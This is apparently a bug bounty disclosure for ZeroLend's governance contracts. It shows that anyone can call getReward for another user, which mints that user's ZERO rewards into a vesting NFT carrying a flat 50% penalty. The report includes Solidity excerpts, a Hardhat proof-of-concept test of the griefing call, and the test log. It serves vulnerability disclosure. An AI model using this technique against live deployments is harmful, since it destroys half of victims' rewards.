# 29198 - \[SC - Medium] Griefing attack to cause the rewards of a user ...

## Griefing attack to cause the rewards of a user to be locked and when users claim the reward after maturity date, user will suffer the penalty.

Submitted on Mar 10th 2024 at 11:49:33 UTC by @perseverance for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29198

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/zerolend/governance>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

### Description

## Description

Griefing attack to cause the rewards of a user to be locked and when users claim the reward after maturity date, user will suffer the penalty.

### Brief/Intro

VestedZeroNFT is a NFT based contract to hold all the user vests. NFTs can be traded on secondary marketplaces like Opensea, can be split into smaller chunks to allow for smaller otc deals to happen in secondary markets.

When mint a NFT tokenIT for a user, the function mint() can be used

<https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L63-L72>

```solidity
function mint(
        address _who,
        uint256 _pending,
        uint256 _upfront,
        uint256 _linearDuration,
        uint256 _cliffDuration,
        uint256 _unlockDate,
        bool _hasPenalty,
        VestCategory _category
    ) external returns (uint256) 

```

If the \_hasPenalty is true, then when users claim, the the zero token of the ownerOf(id) is deducted and amount is toClaim

<https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L170-L171>

```solidity
 uint256 _penalty = penalty(id);
toClaim += lock.pending - _penalty;

```

The \_penalty is <https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L207-L212>

```solidity
/// @inheritdoc IVestedZeroNFT
    function penalty(uint256 tokenId) public view returns (uint256) {
        LockDetails memory lock = tokenIdToLockDetails[tokenId];
        // (, uint256 _pending) = claimable(id);
        // TODO
        return (lock.pending * 5) / 10;
    }

```

<https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L159-L198>

```solidity
function claim(
        uint256 id
    ) public nonReentrant whenNotPaused returns (uint256 toClaim) {
        require(!frozen[id], "frozen");

        LockDetails memory lock = tokenIdToLockDetails[id];

        if (lock.hasPenalty) {
            // if the user hasn't claimed before, then calculate how much penalty should be charged
            // and send the remaining tokens to the user
            if (lock.pendingClaimed == 0) {
                uint256 _penalty = penalty(id);
                toClaim += lock.pending - _penalty;
                lock.pendingClaimed = lock.pending;

                // send the penalty tokens back to the staking bonus
                // contract (used for staking bonuses)
                zero.transfer(stakingBonus, _penalty);
            }
        } else {
            (uint256 _upfront, uint256 _pending) = claimable(id);

            // handle vesting without penalties
            // handle the upfront vesting
            if (_upfront > 0 && lock.upfrontClaimed == 0) {
                toClaim += _upfront;
                lock.upfrontClaimed = _upfront;
            }

            // handle the linear vesting
            if (_pending > 0 && lock.pendingClaimed >= 0) {
                toClaim += _pending - lock.pendingClaimed;
                lock.pendingClaimed += _pending - lock.pendingClaimed;
            }
        }

        tokenIdToLockDetails[id] = lock;

        if (toClaim > 0) zero.transfer(ownerOf(id), toClaim);
    }
```

So the design of the protocol is, if users claim after the maturity date (unlockDate + LinearDuration), then users can claim without the penalty. This can be seen in the comment in line

<https://github.com/zerolend/governance/blob/main/contracts/voter/gauge/RewardBase.sol#L86-L98>

```
if (token == zero) {
            // if the token is ZERO; then vest it linearly for 3 months with a pentalty for
            // early withdrawals.
            vesting.mint(
                account, // address _who,
                _reward, // uint256 _pending,
                0, // uint256 _upfront,
                86400 * 30 * 3, // uint256 _linearDuration,
                0, // uint256 _cliffDuration,
                0, // uint256 _unlockDate,
                true, // bool _hasPenalty,
                IVestedZeroNFT.VestCategory.NORMAL // VestCategory _category
            );
        } else token.safeTransfer(account, _reward);
```

For a user that has aToken and varToken balance != 0, then when aTokenGauge and varToken gauge receive the reward, then the user also have some reward.

The user can receive the reward by calling the getReward function.

<https://github.com/zerolend/governance/blob/main/contracts/voter/gauge/RewardBase.sol#L78-L100>

```solidity
// allows a user to claim rewards for a given token
    function getReward(
        address account,
        IERC20 token
    ) public nonReentrant updateReward(token, account) {
        uint256 _reward = rewards[token][account];
        rewards[token][account] = 0;

        if (token == zero) {
            // if the token is ZERO; then vest it linearly for 3 months with a pentalty for
            // early withdrawals.
            vesting.mint(
                account, // address _who,
                _reward, // uint256 _pending,
                0, // uint256 _upfront,
                86400 * 30 * 3, // uint256 _linearDuration,
                0, // uint256 _cliffDuration,
                0, // uint256 _unlockDate,
                true, // bool _hasPenalty,
                IVestedZeroNFT.VestCategory.NORMAL // VestCategory _category
            );
        } else token.safeTransfer(account, _reward);
    } 
```

So if the reward token is zero then the contract will transfer the zero token to ZeroVestedNFT contract to mint a NFT token for the user. But notice that when minting the NFT token, the \_hasPenalty is true.

The getReward is permissionless so anyone can call the getReward for another account.

### Vulnerability Details

So if the zero rewards of a user is transfered to the ZeroVestedNFT, when claim after the LinearDuration time, the user still suffer the penalty for claimming.

The penalty amount is 50% of the pending reward. The rootcause is because the penalty calculation does not take into account the linearDuration. So the user always suffer the penalty that is 50% of the reward amount even the claim time is > unlockDate + LinearDuration

The \_penalty is <https://github.com/zerolend/governance/blob/main/contracts/vesting/VestedZeroNFT.sol#L207-L212>

```solidity
/// @inheritdoc IVestedZeroNFT
    function penalty(uint256 tokenId) public view returns (uint256) {
        LockDetails memory lock = tokenIdToLockDetails[tokenId];
        // (, uint256 _pending) = claimable(id);
        // TODO
        return (lock.pending * 5) / 10;
    }

```

## Impacts

## About the severity assessment

So the bug allow griefing attack that don't bring benefit to the hacker that cause damage to users. So the Severity is Medium with Category: Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

The bug root cause is that the penalty of ZeroVestedNFT amount calculation does not take into account the LinearDuration and unlockedDate.

## Proof of Concept

Test code POC:

```typescript
it("Griefing attack to cause rewards of users to be locked", async function () {
    
    console.log("Create the pre-condition setup for the griefing attack");

    const [user1] = await hre.ethers.getSigners();
    console.log("Atoken balance of user1: ", await aToken.balanceOf(user1.address));
    let zeroBalance = await zero.balanceOf(user1.address);
    console.log("Zero balance of user1: ", await zero.balanceOf(user1.address));
    console.log("Deposit to get the Weth token"); 
    console.log("The Weth balance of the user1: ", await reserve.balanceOf(user1.address));
    console.log("Mint the Weth token for the user1")
    await reserve.connect(owner)["mint(address,uint256)"](user1.address, e18 * 10000n);
    console.log("The Weth balance of user1: ", await reserve.balanceOf(user1.address));
    console.log("Approve the pool to spend the Weth token of the user1"); 
    await reserve.connect(user1).approve(pool.target, e18 * 10000n);
    console.log("Deposit the Weth token to the pool");
    await pool.connect(user1).supply(reserve.target, e18 * 10000n, user1.address, 0); 
    console.log("The Weth balance of user1: ", await reserve.balanceOf(user1.address));
    console.log("The Atoken balance of user1: ", await aToken.balanceOf(user1.address));

    console.log("Notify the reward amount to the poolVoter contract");
    
    expect(await poolVoter.totalWeight()).eq(0); 
    console.log("totalWeight: ", await poolVoter.totalWeight()); 
    await poolVoter.connect(ant).vote([reserve.target], [1e8]);
    expect(await poolVoter.totalWeight()).greaterThan(e18 * 19n);
    console.log("after vote totalWeight: ", await poolVoter.totalWeight()); 
    console.log("length of pools:", await poolVoter.length());
    console.log("zero balance of PoolVoter: ", await zero.balanceOf(poolVoter.target)); // Should be 0
    console.log("Step: the Deployer (the owner of Zero token) approve the PoolVoter to spend 100 ZERO token");
    await zero.connect(deployer).approve(poolVoter.target, e18 * 100n);
    await poolVoter.connect(deployer).notifyRewardAmount(e18 * 100n);

    console.log("After notifyRewardAmout zero balance of PoolVoter: ", await zero.balanceOf(poolVoter.target));

    splitterGauge = await hre.ethers.getContractAt("LendingPoolGauge", await poolVoter.gauges(reserve.target));
    console.log("The claimable reward of gauge: ", await poolVoter.claimable(splitterGauge.target));
    console.log("Call the updateFor gauge to update the claimable reward for the gauge");
    await poolVoter.connect(ant).updateFor(splitterGauge.target);

    console.log("Distribution of the reward to the gauge");
   
    console.log("Before distribute zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("Before distribute zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));
    await poolVoter.connect(ant)["distribute(address)"](splitterGauge.target);
    console.log("After distribute zero balance of aTokenGauge: ", await zero.balanceOf(aTokenGauge.target));
    console.log("After distribute zero balance of varTokenGauge: ", await zero.balanceOf(varTokenGauge.target));

    console.log("The reward of the user1: ", await aTokenGauge.earned(zero.target, user1.address));
    
    console.log("Address of user1 ", user1.address);

    let lastTokenId = await vest.lastTokenId();
    console.log("LastTokenId: ", lastTokenId);
    console.log("The address of the owner of the lastTokenId: ", await vest.ownerOf(lastTokenId));
    
    

    console.log("Execute the griefing attack");
    const [attacker] = await hre.ethers.getSigners();
    
    console.log("Call getReward to get the reward of the user1");
    await aTokenGauge.connect(attacker).getReward(user1.address, zero);

    
    lastTokenId = await vest.lastTokenId();
    console.log("LastTokenId: ", lastTokenId);
    console.log("The address of the owner of the lastTokenId: ", await vest.ownerOf(lastTokenId));
    
    console.log("Get tokenIdToLockDetails of the lastTokenId");
    let tokenIdToLockDetails = await vest.tokenIdToLockDetails(lastTokenId);

    console.log("tokenIdToLockDetails: ", tokenIdToLockDetails);
    console.log("The pending reward of the user1: ", tokenIdToLockDetails.pending);

    console.log("The user1 call the claim function of the vestZeroNFT contract to claim tokenID of Ant"); 
    
    console.log("Zero balance of user1 after griefing attack", await zero.balanceOf(user1.address));
    console.log("Current timestamp", await helpers.time.latest());
   console.log("Mine 7776001 blocks with interval of 1 second"); 
    await helpers.mine(7776001, { interval: 1 });
    console.log("Current timestamp", await helpers.time.latest());
    zeroBalance = await zero.balanceOf(user1.address);
    console.log("Zero balance of user1: ", await zero.balanceOf(user1.address));
    await vest.connect(user1).claim(lastTokenId); 
    console.log("Zero balance of user1 after griefing attack", await zero.balanceOf(user1.address));
    console.log("Zero amout receive after claim ", await zero.balanceOf(user1.address) - zeroBalance);
    console.log("Zero balance of vestZeroNFT after contract", await zero.balanceOf(vest.target));
    console.log("The unclaimed amount of the tokenID", await vest.unclaimed(lastTokenId));


  });
```

In the above POC, to execute the attack, the hacker call the getReward for user1 and token is zero. By doing so, the reward of user1 is locked with penalty.

```typescript
await aTokenGauge.connect(attacker).getReward(user1.address, zero);
```

When user1 claim after LinearDuration is 3 months, user1 suffer the penalty and get only 50% of the reward.

Test log: Full Test Log: <https://drive.google.com/file/d/1xvXr5S4uS3m34nZgfiKVEprcTk7sEJAY/view?usp=sharing>

```
Create the pre-condition setup for the griefing attack
Atoken balance of user1:  0n
Zero balance of user1:  99999999980000000000000000000n
Deposit to get the Weth token
The Weth balance of the user1:  0n
Mint the Weth token for the user1
The Weth balance of user1:  10000000000000000000000n
Approve the pool to spend the Weth token of the user1
Deposit the Weth token to the pool
The Weth balance of user1:  0n
The Atoken balance of user1:  10000000000000000000000n
Notify the reward amount to the poolVoter contract
totalWeight:  0n
after vote totalWeight:  19996876902587519025n
length of pools: 0n
zero balance of PoolVoter:  0n
Step: the Deployer (the owner of Zero token) approve the PoolVoter to spend 100 ZERO token
After notifyRewardAmout zero balance of PoolVoter:  100000000000000000000n
The claimable reward of gauge:  0n
Call the updateFor gauge to update the claimable reward for the gauge
Distribution of the reward to the gauge
Before distribute zero balance of aTokenGauge:  0n
Before distribute zero balance of varTokenGauge:  0n
After distribute zero balance of aTokenGauge:  24999999999999999998n
After distribute zero balance of varTokenGauge:  74999999999999999994n
The reward of the user1:  0n
Address of user1  0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
LastTokenId:  1n
The address of the owner of the lastTokenId:  0x9E545E3C0baAB3E08CdfD552C960A1050f373042
Execute the griefing attack
Call getReward to get the reward of the user1
LastTokenId:  2n
The address of the owner of the lastTokenId:  0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
Get tokenIdToLockDetails of the lastTokenId
tokenIdToLockDetails:  Result(10) [
  0n,
  1710048507n,
  0n,
  20667989410000n,
  0n,
  0n,
  7776000n,
  1710048507n,
  true,
  2n
]
The pending reward of the user1:  20667989410000n
The user1 call the claim function of the vestZeroNFT contract to claim tokenID of Ant
Zero balance of user1 after griefing attack 99999999880000000000000000000n
Current timestamp 1710048507
Mine 7776001 blocks with interval of 1 second
Current timestamp 1717824508
Zero balance of user1:  99999999880000000000000000000n
Zero balance of user1 after griefing attack 99999999880000010333994705000n
Zero amout receive after claim  10333994705000n
Zero balance of vestZeroNFT after contract 0n
The unclaimed amount of the tokenID 0n
    ✔ Griefing attack to cause rewards of users to be locked (466ms)

```

Test Log explanation:

So Pre-condition: User1 has aToken balance != 0 and the rewards of user1 and zero token is != 0.

In this POC, the reward amount of user 1 is: 20667989410000

Now after the time 7776001 that is the time passed the LinearDuration of the tokenNFT of ZeroVestedNFT, the user1 claim the token, user1 still suffer the penalty amount.

After claim, the user1 get zero token amout: 10333994705000

This amount is = 20667989410000 /2 so means that the zero token amount = 50% of the reward.

To run the POC,

Step 1: First clone the governance repository:

```
git clone https://github.com/zerolend/governance.git
```

Step2: Apply Git patch file

Bug4\_diff.patch link:

<https://drive.google.com/file/d/1tISgj7aXz0\\_Gy3f8MHheL0FxsTDcJ7sG/view?usp=sharing>

Apply the Patch by Git command using Git bash shell

```bash
git apply Bug4_diff.patch
```

Step 3: Input .env variables

cd to folder governance, To run the test, you need to

1. rename .env.example to .env
2. put the test Private\_key to the variable

```
   WALLET_PRIVATE_KEY= 
   NODE_ENV == "test" 
```

Step 4: Install and run test Run command

```
yarn install 
yarn test > test_all.log
```
